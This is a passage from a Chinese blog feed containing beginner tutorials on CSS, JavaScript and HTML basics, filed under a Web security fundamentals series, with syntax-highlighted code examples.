class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;background-color: black;color: gold;text-align: center;&quot;</span>&gt;</span></span><br><span class="line">        CSS基本概念</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CSS内嵌"><a href="#CSS内嵌" class="headerlink" title="CSS内嵌"></a>CSS内嵌</h3><p><strong>通过style标签，在HTML文档中嵌入CSS样式代码</strong></p><ul><li><p>实现样式与内容的分离</p></li><li><p>多个不同标签重用样式</p></li><li><p>方便统一修改</p></li><li><p>内嵌样式案例</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: black;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: gold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CSS基本概念1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CSS基本概念2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CSS外链"><a href="#CSS外链" class="headerlink" title="CSS外链"></a>CSS外链</h3><p><strong>多个不同的页面重用样式，可以采用外链样式</strong></p><ul><li>创建外部样式表文件，后缀使用.css</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 外部样式文件 */</span></span><br><span class="line"><span class="selector-tag">h1</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: black;</span><br><span class="line">    <span class="attribute">color</span>: gold;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在HTML页面中使用link标签引入外部样式表，格式如下</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 外部链接方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/h1.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="JavaScript简介"><a href="#JavaScript简介" class="headerlink" title="JavaScript简介"></a>JavaScript简介</h3><ul><li>诞生于1995年，早期主要用于处理用户的输入验证</li><li>嵌入到HTML页面中，实现页面的特性和行为</li><li>是一种解释性编程语言，基于浏览器解释执行</li><li>发明者是布兰登·艾克</li></ul><h3 id="JavaScript组成"><a href="#JavaScript组成" class="headerlink" title="JavaScript组成"></a>JavaScript组成</h3><p><strong>一个完整的JavaScript实现由下列三个不同的部分组成</strong></p><ul><li>ECMAScript，提供核心语言功能</li><li>文档对象模型（DOM），提供访问和操作文档内容的方法和接口</li><li>浏览器对象模型（BOM），提供与浏览器交互的方法和接口</li></ul><h3 id="JavaScript使用方式"><a href="#JavaScript使用方式" class="headerlink" title="JavaScript使用方式"></a>JavaScript使用方式</h3><p><strong>将JavaScript嵌入页面的三种方式</strong></p><ul><li>元素绑定事件</li><li>文档内嵌</li><li>外部链接</li></ul><p><strong>元素绑定事件</strong></p><ul><li>事件:指用户的行为</li><li>事件处理:元素监听事件，并在事件发生后自动执行事件的过程</li><li>绑定:将事件名称以标签属性的方式绑定到元素上执行事件处理</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;console.log(&#x27;hello world&#x27;)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>文档内嵌</strong></p><ul><li>传统的做法，所有的<script>标签放在页面的<head>标签中</li><li>现代的做法，放到页面的<body>标签中页面内容的后面</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;mybutton&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">click</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&#x27;body中的js脚本&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> button = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mybutton&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        button.<span class="property">onclick</span>=click;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>外部链接</strong></p><ul><li>JavaScript写到单独的文件，页面引入外部的JavaScript文件</li><li>可维护性好</li><li>可缓存</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 外部文件index.js</span><br><span class="line">function click()&#123;</span><br><span class="line">    alert(&#x27;body中的js脚本&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">var button = document.getElementById(&#x27;mybutton&#x27;);</span><br><span class="line">button.onclick=click;</span><br><span class="line"></span><br><span class="line">//html文件内</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;mybutton&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 外部链接方式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="JavaScript的输出方式"><a href="#JavaScript的输出方式" class="headerlink" title="JavaScript的输出方式"></a>JavaScript的输出方式</h3><p><strong>在JavaScript中有三种常用的输出语句</strong></p><ul><li>普通的网页弹框</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;hello world&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>控制台输出</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;变量的值&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>在网页中动态输出</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;输出内容&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="ECMAScript"><a href="#ECMAScript" class="headerlink" title="ECMAScript"></a>ECMAScript</h2><h3 id="ECMAScript-1"><a href="#ECMAScript-1" class="headerlink" title="ECMAScript"></a>ECMAScript</h3><p><strong>ECMAScript的语法大量借鉴了C及其他类C语言的语法</strong></p><p><strong>区分大小写</strong></p><ul><li>无论变量、函数名和操作符都区分大小写</li></ul><p><strong>标识符</strong></p><ul><li>所谓标识符，就是指变量、函数、属性的名字，或者函数的参数</li></ul><p><strong>命名规则</strong></p><ul><li>第一个字符必须是字母、下划线或美元符号</li><li>其它字符是字母、下划线、美元符号或数字</li><li>按照惯例，标识符采用驼峰大小写格式，第一个单词首字母小写，其它每个单词的首字母大写</li><li>不能把关键字、保留字作为标识符</li></ul><p><strong>注释</strong></p><ul><li>包含单行注释和块级注释</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//单行注释</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">   多行注释或块级注释</span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><strong>语句</strong></p><ul><li>ECMAScript中的语句以一个分号结尾</li><li>如果省略分号，则由解释器确定语句的结尾</li><li>语句结尾的分号不是必需的，但是建议任何时候都不要省略它</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><strong>变量是存储数据的容器</strong></p><p><strong>作用</strong></p><ul><li>用于存储程序运行过程中可动态变化的数据</li><li>例如，可以把杯子看成变量，杯子中的水、可乐或果汁就是变量中的数据</li></ul><p><strong>语法</strong></p><ul><li>使用关键字var声明，自定义变量名</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p><strong>变量使用案例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 外部链接方式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 变量先声明</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> b = <span class="number">200</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> c = a+b;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(a,<span class="string">&quot;  &quot;</span>+b,<span class="string">&quot;  &quot;</span>+c);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="输入语句"><a href="#输入语句" class="headerlink" title="输入语句"></a>输入语句</h3><p><strong>prompt（）方法</strong></p><ul><li>可提示用户进行输入的对话框</li></ul><p><strong>语法格式</strong></p><ul><li>text可选，在对话框显示的纯文本</li><li>defaultText可选，默认的输入文本</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prompt(text,defaultText)</span><br></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><strong>在JavaScript中，常用以下4种数据类型</strong></p><ul><li>数值型</li><li>字符串型</li><li>布尔型</li><li>对象型</li></ul><p><strong>数值型</strong></p><ul><li>number类型，可分为整数与小数</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> weight = <span class="number">0.25</span>;</span><br></pre></td></tr></table></figure><p><strong>字符串型</strong></p><ul><li>string字符串类型，字符串是指由一个或多个字符组成，使用单引号或双引号表示</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> info = <span class="string">&#x27;hello world&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>布尔型</strong></p><ul><li>只有true和false两个值</li><li>布尔值与number值可以互相转换；true为1，false为0</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isStart = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> success = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p><strong>对象型</strong></p><ul><li>对象类型可以添加属性和方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;                         <span class="comment">//创建一个叫obj1的对象</span></span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,                      <span class="comment">//属性name值为张三，字符串型</span></span><br><span class="line"><span class="attr">age</span>:<span class="number">18</span>                           <span class="comment">//属性age值为18，数值型</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1);                   <span class="comment">//打印obj1整个对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1.<span class="property">name</span>,obj1.<span class="property">age</span>);     <span class="comment">//打印obj1的name和age属性</span></span><br></pre></td></tr></table></figure><p><strong>类型检测，使用typeof可以进行类型检测</strong></p><p><strong>使用方式</strong></p><ul><li>typeof变量或表达式</li><li>typeof（变量或表达式）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> a);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">typeof</span>(obj1.<span class="property">name</span>))</span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p><strong>JavaScript常用的运算符包括</strong></p><table><thead><tr><th>运算符</th><th>值</th></tr></thead><tbody><tr><td>赋值运算符</td><td>=</td></tr><tr><td>算术运算符</td><td>+  、-  、*  、/  、%  、+=  、-=  、*=  、/=  、%=</td></tr><tr><td>自增自减运算符</td><td>++、--</td></tr><tr><td>关系运算符</td><td>>、<、>+、<=、==、!=、===、!==</td></tr><tr><td>逻辑运算符</td><td>&&、||、!</td></tr></tbody></table><h3 id="认识流程控制"><a href="#认识流程控制" class="headerlink" title="认识流程控制"></a>认识流程控制</h3><p><strong>在页面中，Js代码执行的顺序称之为流程</strong></p><p><strong>根据代码执行的方向和功能的不同，流程可以分为三种</strong></p><ul><li>顺序结构</li><li>选择结构</li><li>循环结构</li></ul><p><strong>顺序结构</strong></p><ul><li>代码的执行由上而下依次执行</li></ul><p><strong>选择结构</strong></p><ul><li>代码的执行根据不同的条件，执行不同的语句。根据条件的数量不同，分以下三种：if语句、if else语句和if  elseif语句</li></ul><h3 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h3><p><strong>if语句</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">语句块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>if else语句</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">语句块<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">语句块<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>if  elseif语句</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式<span class="number">1</span>)&#123;</span><br><span class="line">语句块<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式<span class="number">2</span>)&#123;</span><br><span class="line">语句块<span class="number">2</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式<span class="number">3</span>)&#123;</span><br><span class="line">语句块<span class="number">3</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">语句块<span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择结构案例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if语句</span></span><br><span class="line"><span class="keyword">var</span> age = <span class="title function_">prompt</span>(<span class="string">&#x27;请输入年龄：&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(age &lt; <span class="number">18</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;禁止访问&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">             </span><br><span class="line"><span class="comment">// if else</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="title function_">prompt</span>(<span class="string">&#x27;请输入a的值：&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="title function_">prompt</span>(<span class="string">&#x27;请输入b的值：&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(a &lt; b)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;a和b中最大数为：&#x27;</span> + b);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;a和b中最大数为：&#x27;</span> + a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web应用基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用基础1</title>
      <link href="/posts/webbase1.html"/>
      <url>/posts/webbase1.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用基础"><a href="#Web应用基础" class="headerlink" title="Web应用基础"></a>Web应用基础</h1><h2 id="Web应用入门"><a href="#Web应用入门" class="headerlink" title="Web应用入门"></a>Web应用入门</h2><h3 id="什么是Web应用"><a href="#什么是Web应用" class="headerlink" title="什么是Web应用"></a>什么是Web应用</h3><ul><li>Web就是我们常见的网页、网站</li><li>各种不同类型的网站其作用不同，就是不同的Web应用</li></ul><h3 id="Web应用的发展"><a href="#Web应用的发展" class="headerlink" title="Web应用的发展"></a>Web应用的发展</h3><p><strong>早期Web应用的特点</strong></p><ul><li>使用静态的HTML网页发布信息</li><li>信息的传递是单向的</li><li>缺乏交流和互动</li></ul><p><strong>早期Web应用面临的安全威胁</strong></p><ul><li>服务器被入侵</li><li>网页内容被篡改</li></ul><p><strong>目前流行的Web应用</strong></p><ul><li>用户获取的内容以动态形式生成，能够满足个性需求</li><li>双向信息传送</li><li>支持注册与登录、金融交易、搜索以及用户创作的内容</li></ul><p><strong>目前Web应用面临的安全威胁</strong></p><ul><li>个人信息和数据泄露，各种网络诈骗</li><li>企业机密信息和数据泄露，网络敲诈</li><li>国家重要基础设施的安全问题</li></ul><p><img src="/../img/img_artical/net_sec/12.1.2.png" alt="12.1.2"></p><h3 id="Web应用的组成"><a href="#Web应用的组成" class="headerlink" title="Web应用的组成"></a>Web应用的组成</h3><ul><li>Web应用是指保存或运行在服务器，解析在浏览器的应用程序，又被称为B&#x2F;S（Browser&#x2F;Server）模式的应用</li><li>Web应用使用的是HTTP&#x2F; HTTPS协议</li></ul><p><img src="/../img/img_artical/net_sec/12.1.1.png" alt="12.1.1"></p><h2 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h2><h3 id="HTML基础-1"><a href="#HTML基础-1" class="headerlink" title="HTML基础"></a>HTML基础</h3><p><strong>Web前端-浏览器解析网页过程</strong></p><ul><li>HTML:网页的结构和内容</li><li>CSS:美化网页</li><li>JavaScript:呈现出动态数据和效果</li></ul><h3 id="什么是HTML"><a href="#什么是HTML" class="headerlink" title="什么是HTML"></a>什么是HTML</h3><ul><li>HTML（Hyper Text Markup Language）：超文本标记语言</li><li>保存在以html或htm为后缀的文件中(超文本文件)</li><li>由浏览器解释执行</li><li>通过固定的标签来构建页面结构</li><li>HTML文件不是一种编程语言，而是一种带标记的文本语言，用来设计网页的内容和结构</li></ul><h3 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h3><p><strong>标签也称为标记或元素，用于在网页中标记内容</strong></p><p><strong>语法</strong></p><ul><li>标签使用&lt;&gt;为标志，在&lt;&gt;内部写标签名和标签属性</li><li>注释语法</li><li>标签不区分大小写，推荐小写表示</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签名</span> <span class="attr">属性</span>=<span class="string">属性值</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  此处为注释  --&gt;</span></span><br></pre></td></tr></table></figure><p><strong>分类</strong></p><ul><li>双标签：成对出现，包含开始标签和结束标签<ul><li>双标签可以嵌套其他标签，称之为标签嵌套</li><li>在嵌套结构中，外层标签称之为父标签，内层标签称之为子标签</li><li>平行结构，称之为兄弟标签</li></ul></li><li>单标签：只有开始标签，没有结束标签，可以手动添加 “&#x2F;“ 表示闭合</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 双标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">标签名</span> <span class="attr">属性</span>=<span class="string">属性值</span>&gt;</span>   <span class="tag">&lt;/<span class="name">标签名</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 单标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">标签</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">标签</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>标签属性</strong></p><ul><li>写在开始标签中，使用空格与标签名隔开</li><li>设置当前标签的显示内容或修饰显示效果</li><li>由 属性名&#x3D; 属性值 组成，属性值用双引号表示</li><li>同一个标签中可以添加若干组标签属性，使用空格隔开</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="HTML页面基本结构"><a href="#HTML页面基本结构" class="headerlink" title="HTML页面基本结构"></a>HTML页面基本结构</h3><p><strong>页面结构</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 文档类型声明，便于浏览器正确解析标签及渲染样式 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 网页标题，显示在网页选项卡上 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>网页标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 网页字符编码 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">chatset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        网页主题内容</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 文档结束 --&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>HTML语言有多个不同的版本</p></li><li><p>只有完全明白页面中使用的确切HTML版本，浏览器才能正确显示页面内容</p></li><li><pre><code>&lt;!doctype html&gt;作用为通知浏览器，文档按照html5标准来解析<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 专业的开发工具（例如：vs code）支持HTML代码补全功能</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## HTML常用标签</span><br><span class="line"></span><br><span class="line">### 文本标签</span><br><span class="line"></span><br><span class="line">**标题标签**</span><br><span class="line"></span><br><span class="line">* 自带加粗效果，从h1到h6字体大小逐级递减</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line">&lt;h1&gt;一级标题&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;二级标题&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;三级标题&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;四级标题&lt;/h4&gt;</span><br><span class="line">&lt;h5&gt;五级标题&lt;/h5&gt;</span><br><span 